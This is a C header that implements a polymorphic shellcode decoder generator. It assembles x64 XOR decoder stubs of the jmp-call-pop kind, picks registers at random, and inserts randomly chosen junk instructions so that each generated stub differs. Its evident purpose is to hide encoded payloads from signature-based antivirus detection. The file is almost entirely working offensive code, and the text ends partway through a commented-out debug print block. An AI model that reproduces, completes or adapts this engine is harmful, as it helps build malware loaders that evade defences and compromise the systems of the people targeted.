#pragma once

#ifndef POLY_SHELLCODE_GEN
#define POLY_SHELLCODE_GEN

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


typedef struct _POLYGEN_SHELLCODE
{
	DWORD   dwPosition;         // Position in shellcode                        - used for debugging purposes
    DWORD   dwVariant;          // Variant group ID
    DWORD   dwLength;           // Actual instruction length
    BYTE    InstructionSet[8];  // Max 8 bytes for longest instructions
    LPCSTR  Comment;            // Description                                  - used for debugging purposes

} POLYGEN_SHELLCODE, * PPOLYGEN_SHELLCODE;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _GARBAGE_INSTRUCTIONS
{
	DWORD   dwLength;               // Actual instruction length
	BYTE    InstructionSet[10];     // Max 10 bytes for longest instructions
	BOOL    bRequirePatching;       // If TRUE, the last 2 bytes of the instruction set will be patched with a random value
	LPCSTR  Comment;                // Description                              - used for debugging purposes

} GARBAGE_INSTRUCTIONS, *PGARBAGE_INSTRUCTIONS;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Position X: Dummy Instructions
GARBAGE_INSTRUCTIONS DummyInstructions[ ] =
{
    {.bRequirePatching = FALSE, .dwLength = 1, .InstructionSet = {0x90}, .Comment = "nop" },
    {.bRequirePatching = FALSE, .dwLength = 2, .InstructionSet = {0x90, 0x90}, .Comment = "nop; nop" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x4D, 0x89, 0xDB}, .Comment = "mov r11, r11" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x4D, 0x89, 0xC0}, .Comment = "mov r8, r8" },

    {.bRequirePatching = FALSE, .dwLength = 2, .InstructionSet = {0x66, 0x90}, .Comment = "xchg ax, ax" },
    {.bRequirePatching = FALSE, .dwLength = 4, .InstructionSet = {0x66, 0x45, 0x87, 0xC0}, .Comment = "xchg r8w, r8w" },
    {.bRequirePatching = FALSE, .dwLength = 2, .InstructionSet = {0x87, 0xC0}, .Comment = "xchg eax, eax" },
    {.bRequirePatching = FALSE, .dwLength = 4, .InstructionSet = {0x0F, 0x1F, 0x40, 0x00}, .Comment = "nop DWORD PTR [rax+0x00]" },
    {.bRequirePatching = FALSE, .dwLength = 6, .InstructionSet = {0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00}, .Comment = "nop WORD PTR [rax+rax*1+0x0]" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x4D, 0x31, 0xFF}, .Comment = "xor r15, r15" },
    {.bRequirePatching = FALSE, .dwLength = 7, .InstructionSet = {0x4D, 0x8D, 0x1B, 0x4D, 0x8D, 0x1C, 0x03}, .Comment = "lea r11,[r11]; lea r11,[r11+rax*1]" },
    {.bRequirePatching = FALSE, .dwLength = 8, .InstructionSet = {0x4D, 0x8D, 0x24, 0x24, 0x4D, 0x8D, 0x24, 0x04}, .Comment = "lea r12,[r12]; lea r12,[r12+rax*1]" },

    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x48, 0x85, 0xC0}, .Comment = "test rax, rax" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x48, 0x39, 0xC0}, .Comment = "cmp rax, rax" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x4D, 0x85, 0xFF}, .Comment = "test r15, r15" },
    {.bRequirePatching = FALSE, .dwLength = 3, .InstructionSet = {0x4D, 0x39, 0xF6}, .Comment = "cmp r14, r14" },


    // Require Patching (we'll make it so that only the last 2 bytes needs patching)
    {.bRequirePatching = TRUE, .dwLength = 6, .InstructionSet = {0x66, 0x41, 0x81, 0xC2, 0x00, 0x00}, .Comment = "add r10w, 0xXXXX" },
    {.bRequirePatching = TRUE, .dwLength = 6, .InstructionSet = {0x66, 0x41, 0x81, 0xEB, 0x00, 0x00}, .Comment = "sub r11w, 0xXXXX" },
    {.bRequirePatching = TRUE, .dwLength = 6, .InstructionSet = {0x66, 0x41, 0x81, 0xC9, 0x00, 0x00}, .Comment = "or r9w, 0xXXXX" },
    {.bRequirePatching = TRUE, .dwLength = 6, .InstructionSet = {0x41, 0xBF, 0x00, 0x00, 0x00, 0x00}, .Comment = "mov r15d, 0xXXXX" },


    // TODO: add more dummy instructions that require patching
	// NOTE: avoid creating big instructions because we use 'short' jumps in the shellcode. These are of range -128 to +127 (you dont want to exceed this range)
};

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


// Position 0: XOR RCX, RCX
POLYGEN_SHELLCODE ClearRcx[] =
{
    {.dwPosition = 0, .dwVariant = 0x00, .dwLength = 3, .InstructionSet = {0x48, 0x31, 0xC9}, .Comment = "xor rcx, rcx" },
    {.dwPosition = 0, .dwVariant = 0x01, .dwLength = 2, .InstructionSet = {0x31, 0xC9}, .Comment = "xor ecx, ecx" },
	{.dwPosition = 0, .dwVariant = 0x02, .dwLength = 2, .InstructionSet = {0x31, 0xC9}, .Comment = "xor ecx, ecx" },        // Repeated - (mov/and ecx, 0) are 5/6 bytes - i want to stick to 2/3 bytes
    {.dwPosition = 0, .dwVariant = 0x03, .dwLength = 2, .InstructionSet = {0x29, 0xC9}, .Comment = "sub ecx, ecx" },
};


/*
// Position 1: jmp [calc_offset]
*/
POLYGEN_SHELLCODE JmpCalcOffset[] =
{
    {.dwPosition = 1, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0xEB, 0x00}, .Comment = "jmp short OFFSET" },
};


// Position 2: POP + PUSH address register
POLYGEN_SHELLCODE PopPushAddr[] =
{
    {.dwPosition = 2, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0x5E, 0x56}, .Comment = "pop rsi; push rsi" },
    {.dwPosition = 2, .dwVariant = 0x01, .dwLength = 2, .InstructionSet = {0x5F, 0x57}, .Comment = "pop rdi; push rdi" },
    {.dwPosition = 2, .dwVariant = 0x02, .dwLength = 2, .InstructionSet = {0x5B, 0x53}, .Comment = "pop rbx; push rbx" },
    {.dwPosition = 2, .dwVariant = 0x03, .dwLength = 2, .InstructionSet = {0x5A, 0x52}, .Comment = "pop rdx; push rdx" },
};


// Position 3: Set CL = 0x86 (loop counter)
POLYGEN_SHELLCODE SetCounterCL[] =
{
    {.dwPosition = 3, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0xB1, 0x86}, .Comment = "mov cl, 0x86" },
    {.dwPosition = 3, .dwVariant = 0x01, .dwLength = 5, .InstructionSet = {0x30, 0xC9, 0x80, 0xC1, 0x86}, .Comment = "xor cl,cl; add cl,0x86" },
    {.dwPosition = 3, .dwVariant = 0x02, .dwLength = 5, .InstructionSet = {0x30, 0xC9, 0x80, 0xC9, 0x86}, .Comment = "xor cl,cl; or cl,0x86" },
};


// Position 4: MOV calc_reg, CL
POLYGEN_SHELLCODE MovCalcReg[] =
{
    {.dwPosition = 4, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0x88, 0xC8}, .Comment = "mov al, cl" },
    {.dwPosition = 4, .dwVariant = 0x01, .dwLength = 2, .InstructionSet = {0x88, 0xCA}, .Comment = "mov dl, cl" },
    {.dwPosition = 4, .dwVariant = 0x02, .dwLength = 2, .InstructionSet = {0x88, 0xCB}, .Comment = "mov bl, cl" },
};


// Position 5: NEG calc_reg
POLYGEN_SHELLCODE NegCalcReg[] =
{
    {.dwPosition = 5, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0xF6, 0xD8}, .Comment = "neg al" },
    {.dwPosition = 5, .dwVariant = 0x01, .dwLength = 2, .InstructionSet = {0xF6, 0xDA}, .Comment = "neg dl" },
    {.dwPosition = 5, .dwVariant = 0x02, .dwLength = 2, .InstructionSet = {0xF6, 0xDB}, .Comment = "neg bl" },
};

// Position 6: ADD calc_reg, KEY
POLYGEN_SHELLCODE AddXorKey[] =
{
    {.dwPosition = 6, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0x04, 0x00}, .Comment = "add al, KEY" },
    {.dwPosition = 6, .dwVariant = 0x01, .dwLength = 3, .InstructionSet = {0x80, 0xC2, 0x00}, .Comment = "add dl, KEY" },
    {.dwPosition = 6, .dwVariant = 0x02, .dwLength = 3, .InstructionSet = {0x80, 0xC3, 0x00}, .Comment = "add bl, KEY" },
};


// Position 7: ADD calc_reg, BUFFER_SIZE
POLYGEN_SHELLCODE AddBufferSize[] =
{
    {.dwPosition = 7, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0x04, 0x86}, .Comment = "add al, 0x86" },
    {.dwPosition = 7, .dwVariant = 0x01, .dwLength = 3, .InstructionSet = {0x80, 0xC2, 0x86}, .Comment = "add dl, 0x86" },
    {.dwPosition = 7, .dwVariant = 0x02, .dwLength = 3, .InstructionSet = {0x80, 0xC3, 0x86}, .Comment = "add bl, 0x86" },
};

/*
// Position 8: XOR [calc_reg], calc_reg
*/
POLYGEN_SHELLCODE XorCalcReg[] =
{
    {.dwPosition = 8, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0x30, 0x00 }, .Comment = "xor BYTE PTR [REG64], REG8" },
};


// Position 9: inc calc_reg
POLYGEN_SHELLCODE IncAddrReg[] =
{
    {.dwPosition = 9, .dwVariant = 0x00, .dwLength = 3, .InstructionSet = {0x48, 0xFF, 0xC6}, .Comment = "inc rsi" },
    {.dwPosition = 9, .dwVariant = 0x01, .dwLength = 3, .InstructionSet = {0x48, 0xFF, 0xC7}, .Comment = "inc rdi" },
    {.dwPosition = 9, .dwVariant = 0x02, .dwLength = 3, .InstructionSet = {0x48, 0xFF, 0xC3}, .Comment = "inc rbx" },
    {.dwPosition = 9, .dwVariant = 0x03, .dwLength = 3, .InstructionSet = {0x48, 0xFF, 0xC2}, .Comment = "inc rdx" },
};

/*
// Position 10: LOOP [calc_offset]
*/
POLYGEN_SHELLCODE LoopCalcOffset[] =
{
    {.dwPosition = 10, .dwVariant = 0x00, .dwLength = 2, .InstructionSet = {0xE2, 0x00}, .Comment = "loop OFFSET" },
};

// // Position 11: POP + JMP [calc_reg]
POLYGEN_SHELLCODE PopAddr[] =
{
    {.dwPosition = 11, .dwVariant = 0x00, .dwLength = 3, .InstructionSet = {0x5E, 0xFF, 0xE6}, .Comment = "pop rsi; jmp rsi" },
    {.dwPosition = 11, .dwVariant = 0x01, .dwLength = 3, .InstructionSet = {0x5F, 0xFF, 0xE7}, .Comment = "pop rdi; jmp rdi" },
    {.dwPosition = 11, .dwVariant = 0x02, .dwLength = 3, .InstructionSet = {0x5B, 0xFF, 0xE3}, .Comment = "pop rbx; jmp rbx" },
    {.dwPosition = 11, .dwVariant = 0x03, .dwLength = 3, .InstructionSet = {0x5A, 0xFF, 0xE2}, .Comment = "pop rdx; jmp rdx" },
};

/*
// Position 12: CALL [calc_offset]
*/

POLYGEN_SHELLCODE CallOffset[] =
{
    {.dwPosition = 12, .dwVariant = 0x00, .dwLength = 5, .InstructionSet = {0xE8, 0x00, 0x00, 0x00, 0x00}, .Comment = "call OFFSET" },
};


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


/*
unsigned char g_TinyXorDecoderShellcode [ ] =
{
    0xEB, 0x16,                     // jmp      0x18
    0x5E,                           // pop      rsi
    0x56,                           // push     rsi
    0xB1, 0x86,                     // mov      cl, BUFFER_SIZE     (0x86)      -- this is the size of 'AlphabeticalDecoder'
    0x88, 0xC8,                     // mov      al, cl
    0xF6, 0xD8,                     // neg      al
    0x04, 0x35,                     // add      al, XOR_KEY         (0x35)      -- this is the 'g_bTinyEncoderXorKey' XOR key                     [DYNAMIC]
    0x04, 0x86,                     // add      al, BUFFER_SIZE     (0x86)      -- this is the size of 'AlphabeticalDecoder'
    0x30, 0x06,                     // xor      BYTE PTR [rsi], al
    0x48, 0xFF, 0xC6,               // inc      rsi
    0xE2, 0xF1,                     // loop     0x6
    0x5E,                           // pop      rsi
    0xFF, 0xE6,                     // jmp      rsi
    0xE8, 0xE5, 0xFF, 0xFF, 0xFF    // call     0x2
};
*/



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

extern BOOL GenRandomByte(OUT PBYTE pRndValue);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL FetchADummyAhhInstruction(OUT PBYTE* ppDummyInst, OUT PDWORD pdwDummyInstLength, IN DWORD dwPercentage)
{
	DWORD   dwSizeOfDummyInstructions       = sizeof(DummyInstructions) / sizeof(GARBAGE_INSTRUCTIONS),
            dwPercentageValue               = 0x00,
            dwRandomIndex                   = 0x00;
    BYTE    pRandomByte                     = 0x00;
    PBYTE   pDummyInst                      = NULL;
    BOOL	bResult                         = FALSE;


    if (!GenRandomByte((PBYTE)&dwPercentageValue))
        return FALSE;

	dwPercentageValue = dwPercentageValue % 100;  // Limit to 0-99

    if (dwPercentageValue >= dwPercentage)
    {
		// Skip dummy instruction generation
        *ppDummyInst        = NULL;
        *pdwDummyInstLength = 0x00;
        return FALSE;
	}

    if (!GenRandomByte((PBYTE)&dwRandomIndex))
        return FALSE;

    dwRandomIndex = dwRandomIndex % dwSizeOfDummyInstructions;

    if (!(pDummyInst = LocalAlloc(LPTR, DummyInstructions[dwRandomIndex].dwLength)))
    {
        printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
        return FALSE;
    }

	RtlCopyMemory(pDummyInst, DummyInstructions[dwRandomIndex].InstructionSet, DummyInstructions[dwRandomIndex].dwLength);

    if (DummyInstructions[dwRandomIndex].bRequirePatching)
    {
        if (!GenRandomByte((PBYTE)&pRandomByte))
            goto _END_OF_FUNC;

        pDummyInst[DummyInstructions[dwRandomIndex].dwLength - 2] = (BYTE)(pRandomByte % 0xFF);

        if (!GenRandomByte((PBYTE)&pRandomByte))
            goto _END_OF_FUNC;

        pDummyInst[DummyInstructions[dwRandomIndex].dwLength - 1] = (BYTE)(pRandomByte % 0xFF);
    }

	/*
    printf("[i] Inserted Dummy Instruction: %s\n", DummyInstructions[dwRandomIndex].Comment);
    */

    *ppDummyInst        = pDummyInst;
    *pdwDummyInstLength = DummyInstructions[dwRandomIndex].dwLength;
    bResult             = TRUE;

_END_OF_FUNC:
    if (!bResult)
    {
		LocalFree(pDummyInst);
		*ppDummyInst        = NULL;
		*pdwDummyInstLength = 0x00;
    }
	return bResult;
}



// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==


BOOL GenerateRandomVariant(IN OUT PBYTE pTinyXorDecoder, OUT DWORD* pdwTinyXorDecoderLength, IN BYTE bXorKey)
{

	WORD        dw64BitRegisterVariant      = 0x00;
	WORD        dw8BitRegisterVariant       = 0x00;
	BYTE	    bRegField                   = 0x00,
                bRmField                    = 0x00,
                bModRmByte                  = 0x00;
    INT         iDisplacement8              = 0x00;
	DWORD	    dwLoopStartOffset           = 0x00,
                dwJmpOffset                 = 0x00,
                dwDecoderOffset             = 0x00,
                dwGetAddressOffset		    = 0x00;
    DWORD       dwShellcodeLength           = 0x00;
    PBYTE       pDummyInst                  = NULL;
    DWORD       dwDummyInstLength            = 0x00;

	if (!GenRandomByte(&dw64BitRegisterVariant) || !GenRandomByte(&dw8BitRegisterVariant))
    {
        return FALSE;
	}

	// RSI (0x00), RDI (0x01), RBX (0x02), RDX (0x03)
	dw64BitRegisterVariant = (dw64BitRegisterVariant % 4);  // Limit to 0-3 for 64-bit registers
	// AL (0x00), DL (0x01), BL (0x02)
	dw8BitRegisterVariant  = (dw8BitRegisterVariant % 3);   // Limit to 0-2 for 8-bit registers

    // Avoid using the RDX (VAR: 0x03) with DL (VAR: 0x01)
    // Avoid using the RBX (VAR: 0x02) with BL (VAR: 0x02)
    while ((dw64BitRegisterVariant == 0x03 && dw8BitRegisterVariant == 0x01) || (dw64BitRegisterVariant == 0x02 && dw8BitRegisterVariant == 0x02))
    {

        if (!GenRandomByte(&dw64BitRegisterVariant) || !GenRandomByte(&dw8BitRegisterVariant))
        {
            return FALSE;
		}

        dw64BitRegisterVariant  = (dw64BitRegisterVariant % 4);
        dw8BitRegisterVariant   = (dw8BitRegisterVariant % 3);
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// 50% chance to add a dummy instruction
    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 50))
    {
        RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
        dwShellcodeLength += dwDummyInstLength;
        LocalFree(pDummyInst);
		pDummyInst = NULL;
		dwDummyInstLength = 0x00;
	}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, ClearRcx[dw64BitRegisterVariant].InstructionSet, ClearRcx[dw64BitRegisterVariant].dwLength);
    dwShellcodeLength += ClearRcx[dw64BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// This is just a placeholder
	// Offset calculation is done later as we dont know the shellcode body length yet

    // Save the current position for the jmp OFFSET instruction patching
    dwJmpOffset = dwShellcodeLength;

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, JmpCalcOffset->InstructionSet, JmpCalcOffset->dwLength);
	dwShellcodeLength += JmpCalcOffset->dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// Save the current position for the call OFFSET instruction patching
    dwDecoderOffset = dwShellcodeLength;

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, PopPushAddr[dw64BitRegisterVariant].InstructionSet, PopPushAddr[dw64BitRegisterVariant].dwLength);
    dwShellcodeLength += PopPushAddr[dw64BitRegisterVariant].dwLength;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // 25% chance to add a dummy instruction
    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 25))
    {
        RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
        dwShellcodeLength += dwDummyInstLength;
        LocalFree(pDummyInst);
        pDummyInst = NULL;
        dwDummyInstLength = 0x00;
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, SetCounterCL[dw8BitRegisterVariant].InstructionSet, SetCounterCL[dw8BitRegisterVariant].dwLength);
	dwShellcodeLength += SetCounterCL[dw8BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // 50% chance to add a dummy instruction
    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 50))
    {
        RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
        dwShellcodeLength += dwDummyInstLength;
        LocalFree(pDummyInst);
        pDummyInst = NULL;
        dwDummyInstLength = 0x00;
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // Save the current position for the loop OFFSET instruction patching
	dwLoopStartOffset = dwShellcodeLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, MovCalcReg[dw8BitRegisterVariant].InstructionSet, MovCalcReg[dw8BitRegisterVariant].dwLength);
	dwShellcodeLength += MovCalcReg[dw8BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, NegCalcReg[dw8BitRegisterVariant].InstructionSet, NegCalcReg[dw8BitRegisterVariant].dwLength);
    dwShellcodeLength += NegCalcReg[dw8BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    if (dw8BitRegisterVariant == 0x00)
		AddXorKey[dw8BitRegisterVariant].InstructionSet[1] = bXorKey; // Set XOR key for AL
    else
		AddXorKey[dw8BitRegisterVariant].InstructionSet[2] = bXorKey; // Set XOR key for DL or BL


	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, AddXorKey[dw8BitRegisterVariant].InstructionSet, AddXorKey[dw8BitRegisterVariant].dwLength);
	dwShellcodeLength += AddXorKey[dw8BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, AddBufferSize[dw8BitRegisterVariant].InstructionSet, AddBufferSize[dw8BitRegisterVariant].dwLength);
	dwShellcodeLength += AddBufferSize[dw8BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    switch (dw8BitRegisterVariant)
    {
        case 0: bRegField = 0; break;  // AL
        case 1: bRegField = 2; break;  // DL
        case 2: bRegField = 3; break;  // BL
    }

    // Set the r/m field based on addr_variant
    switch (dw64BitRegisterVariant)
    {
        case 0: bRmField = 0x06; break;  // [RSI]
        case 1: bRmField = 0x07; break;  // [RDI]
        case 2: bRmField = 0x03; break;  // [RBX]
        case 3: bRmField = 0x02; break;  // [RDX]
    }

    // mod=00 (no displacement), reg=bRegField, r/m=bRmField
    bModRmByte = (0u << 6) | (bRegField << 3) | bRmField;
	XorCalcReg->InstructionSet[1] = bModRmByte;

	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, XorCalcReg->InstructionSet, XorCalcReg->dwLength);
	dwShellcodeLength += XorCalcReg->dwLength;


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // 25% chance to add a dummy instruction
    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 25))
    {
        RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
        dwShellcodeLength += dwDummyInstLength;
        LocalFree(pDummyInst);
        pDummyInst = NULL;
        dwDummyInstLength = 0x00;
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, IncAddrReg[dw64BitRegisterVariant].InstructionSet, IncAddrReg[dw64BitRegisterVariant].dwLength);
	dwShellcodeLength += IncAddrReg[dw64BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    iDisplacement8 = (int)dwLoopStartOffset - (int)(dwShellcodeLength + 2);
    if (iDisplacement8 < -128 || iDisplacement8 > 127)
    {
        printf("[!] Displacement Out Of Range For The LOOP Instruction: %d\n", iDisplacement8);
        return FALSE;
	}

	LoopCalcOffset->InstructionSet[1] = (BYTE)iDisplacement8;
	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, LoopCalcOffset->InstructionSet, LoopCalcOffset->dwLength);
	dwShellcodeLength += LoopCalcOffset->dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, PopAddr[dw64BitRegisterVariant].InstructionSet, PopAddr[dw64BitRegisterVariant].dwLength);
    dwShellcodeLength += PopAddr[dw64BitRegisterVariant].dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // 50% chance to add a dummy instruction
    if (FetchADummyAhhInstruction(&pDummyInst, &dwDummyInstLength, 50))
    {
        RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, pDummyInst, dwDummyInstLength);
        dwShellcodeLength += dwDummyInstLength;
        LocalFree(pDummyInst);
        pDummyInst = NULL;
        dwDummyInstLength = 0x00;
    }

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// Save the current position for the call OFFSET instruction patching
	dwGetAddressOffset = dwShellcodeLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// Patching the jmp short OFFSET instruction

	iDisplacement8 = (INT)dwGetAddressOffset - (INT)(dwJmpOffset + 2);

    if (iDisplacement8 < -128 || iDisplacement8 > 127)
    {
        printf("[!] Displacement Out Of Range For The JMP SHORT Instruction: %d\n", iDisplacement8);
        return FALSE;
    }

	JmpCalcOffset->InstructionSet[1] = (BYTE)iDisplacement8; // Set the displacement for the jmp instruction

	RtlCopyMemory(pTinyXorDecoder + dwJmpOffset, JmpCalcOffset->InstructionSet, JmpCalcOffset->dwLength);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

    // Patching the call OFFSET instruction

    iDisplacement8 = (INT)dwDecoderOffset - (INT)(dwGetAddressOffset + 5);

	RtlCopyMemory(&CallOffset->InstructionSet[1], &iDisplacement8, sizeof(DWORD));

	RtlCopyMemory(pTinyXorDecoder + dwShellcodeLength, CallOffset->InstructionSet, CallOffset->dwLength);
	dwShellcodeLength += CallOffset->dwLength;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

	// Print all the generated shellcode instructions

    /*
    printf("\n");
	printf("[i] Generated TinyXorDecoder Shellcode Instructions (No Dummy Instructions Included):\n");
    printf("\t%s\n", ClearRcx[dw64BitRegisterVariant].Comment);
	printf("\t%s [0x%0.2X]\n", JmpCalcOffset->Comment, JmpCalcOffset->InstructionSet[1]);
	printf("\t%s\n", PopPushAddr[dw64BitRegisterVariant].Comment);
